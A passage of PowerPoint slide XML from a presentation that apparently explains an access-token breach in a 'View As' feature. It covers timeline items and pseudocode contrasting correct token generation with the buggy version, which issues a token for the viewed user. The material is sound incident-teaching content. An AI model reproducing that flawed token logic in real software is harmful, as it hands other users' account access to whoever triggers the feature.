          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6942475" y="3564017"/>
            <a:ext cx="282178" cy="15240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 259269"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B2D4E5"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Shape 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7209413" y="3465909"/>
            <a:ext cx="211574" cy="211574"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 18676"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CCEEFF"/>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="B2D4E5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Text 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7241084" y="3479066"/>
            <a:ext cx="148114" cy="185142"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="1150"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>3</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Text 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5503426" y="3498175"/>
            <a:ext cx="1341477" cy="154305"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="r">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Happy Birthday Feature</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Text 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="578882" y="3679150"/>
            <a:ext cx="6266021" cy="110847"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="r">
              <a:lnSpc>
                <a:spcPts val="850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Birthday celebration tool that triggered video uploader in certain contexts</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Shape 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7405747" y="4001095"/>
            <a:ext cx="282178" cy="15240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 259269"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B2D4E5"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Shape 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7209413" y="3902988"/>
            <a:ext cx="211574" cy="211574"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 18676"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CCEEFF"/>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="B2D4E5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="Text 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7241084" y="3916144"/>
            <a:ext cx="148114" cy="185142"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="1150"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>4</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="Text 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7785497" y="3935254"/>
            <a:ext cx="1249561" cy="154305"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Token Generation Bug</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Text 36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7785497" y="4116229"/>
            <a:ext cx="6266021" cy="110847"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Critical flaw: Generated access tokens for viewed user instead of viewing user</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Shape 37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6942475" y="4438174"/>
            <a:ext cx="282178" cy="15240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 259269"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B2D4E5"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="Shape 38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7209413" y="4340066"/>
            <a:ext cx="211574" cy="211574"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 18676"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CCEEFF"/>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="B2D4E5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="Text 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7241084" y="4353223"/>
            <a:ext cx="148114" cy="185142"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="1150"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="Text 40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5594033" y="4372332"/>
            <a:ext cx="1250871" cy="154305"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="r">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Complete Token Theft</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="44" name="Text 41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="578882" y="4553307"/>
            <a:ext cx="6266021" cy="110847"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="r">
              <a:lnSpc>
                <a:spcPts val="850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attackers obtained valid access tokens enabling full account control</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="45" name="Text 42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="578882" y="5219700"/>
            <a:ext cx="2150269" cy="185142"/>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Technical Implementation Flaw</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="46" name="Text 43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="578882" y="5449372"/>
            <a:ext cx="6621661" cy="110847"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Normal Expected Behavior:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47" name="Shape 44"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="578882" y="5610344"/>
            <a:ext cx="6621661" cy="695206"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5684"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="Shape 45"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="574238" y="5610344"/>
            <a:ext cx="6630948" cy="695206"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2030"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="49" name="Text 46"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="668298" y="5680829"/>
            <a:ext cx="6442829" cy="554236"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>viewAs(targetUserId) {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  // Should generate token for current user</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  token = generateToken(currentUser.id);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  return token;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="50" name="Text 47"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="578882" y="6293823"/>
            <a:ext cx="6621661" cy="110847"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Actual Buggy Behavior:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="51" name="Shape 48"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="578882" y="6454795"/>
            <a:ext cx="6621661" cy="916900"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4309"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52" name="Shape 49"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="574238" y="6454795"/>
            <a:ext cx="6630948" cy="916900"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1539"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="53" name="Text 50"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="668298" y="6525280"/>
            <a:ext cx="6442829" cy="775930"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>viewAs(targetUserId) {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  // Generated token for TARGET user instead!</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  token = generateToken(targetUserId);  // ← BUG</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  // This token has full permissions </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  // for the target user's account</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
